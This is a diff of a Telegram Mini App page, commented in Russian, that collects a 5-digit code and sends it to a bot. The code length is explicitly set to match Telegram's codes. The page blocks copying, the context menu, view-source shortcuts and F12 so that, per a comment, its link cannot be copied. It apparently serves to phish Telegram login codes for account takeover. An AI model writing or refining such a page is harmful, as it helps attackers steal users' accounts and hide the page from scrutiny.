@@ -253,7 +253,6 @@
         // Проверка, открыто ли в Telegram
         let tg = window.Telegram?.WebApp;
         
-        // Если не в Telegram - показываем ошибку и блокируем
         if (!tg) {
             document.body.innerHTML = `
                 <div style="text-align: center; padding: 50px 20px;">
@@ -266,57 +265,29 @@
         }
         
         let code = '';
-        const MAX_CODE_LENGTH = 5; // ИСПРАВЛЕНО: максимум 5 цифр для Telegram
+        const MAX_CODE_LENGTH = 5;
         
-        // Настройка темы
         tg.setHeaderColor('#1a1a2e');
         tg.setBackgroundColor('#0f3460');
         tg.expand();
-        
-        // Отправляем готовность
         tg.ready();
         
-        // Блокируем контекстное меню (чтобы нельзя было скопировать ссылку)
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Блокируем выделение текста
-        document.addEventListener('selectstart', function(e) {
-            e.preventDefault();
-            return false;
-        });
-        
-        // Блокируем долгое нажатие на мобильных
-        document.addEventListener('touchstart', function(e) {
-            if (e.touches.length > 1) {
-                e.preventDefault();
-            }
+        // Защита от копирования/контекстного меню
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('touchstart', e => {
+            if (e.touches.length > 1) e.preventDefault();
         }, { passive: false });
-        
-        // Блокируем стандартные сочетания клавиш
-        document.addEventListener('keydown', function(e) {
-            // Ctrl+C, Ctrl+V, Ctrl+S, Ctrl+U
-            if (e.ctrlKey && ['c', 'v', 's', 'u'].includes(e.key.toLowerCase())) {
-                e.preventDefault();
-                return false;
-            }
-            // F12
-            if (e.key === 'F12') {
-                e.preventDefault();
-                return false;
-            }
+        document.addEventListener('keydown', e => {
+            if (e.ctrlKey && ['c', 'v', 's', 'u'].includes(e.key.toLowerCase())) e.preventDefault();
+            if (e.key === 'F12') e.preventDefault();
         });
         
-        // Функция для показа ошибки
         function showError(message) {
             const errorDiv = document.getElementById('errorMessage');
             errorDiv.textContent = message;
             errorDiv.classList.add('active');
-            setTimeout(() => {
-                errorDiv.classList.remove('active');
-            }, 3000);
+            setTimeout(() => errorDiv.classList.remove('active'), 3000);
         }
         
         function updateDisplay() {
@@ -339,12 +310,8 @@
                 updateDisplay();
                 tg.HapticFeedback.impactOccurred('light');
                 
-                // Если достигли 5 цифр, можно автоматически подтверждать
                 if (code.length === MAX_CODE_LENGTH) {
-                    // Задержка 300мс для лучшего UX
-                    setTimeout(() => {
-                        submitCode();
-                    }, 300);
+                    setTimeout(submitCode, 300);
                 }
             } else {
                 showError(`Максимум ${MAX_CODE_LENGTH} цифр`);
@@ -381,28 +348,16 @@
             showLoading();
             tg.HapticFeedback.notificationOccurred('success');
             
-            // Отправляем код обратно в бота
             tg.sendData(JSON.stringify({
                 action: 'code_input',
                 code: code
             }));
             
-            // Закрываем через 2 секунды если что-то пошло не так
-            setTimeout(() => {
-                hideLoading();
-            }, 2000);
+            setTimeout(hideLoading, 2000);
         }
         
-        // Обработка закрытия
-        tg.onEvent('viewportChanged', function() {
-            tg.expand();
-        });
+        tg.onEvent('viewportChanged', () => tg.expand());
         
-        tg.onEvent('themeChanged', function() {
-            // Обновляем тему если нужно
-        });
-        
-        // Основной цикл
         updateDisplay();
     </script>
 </body>
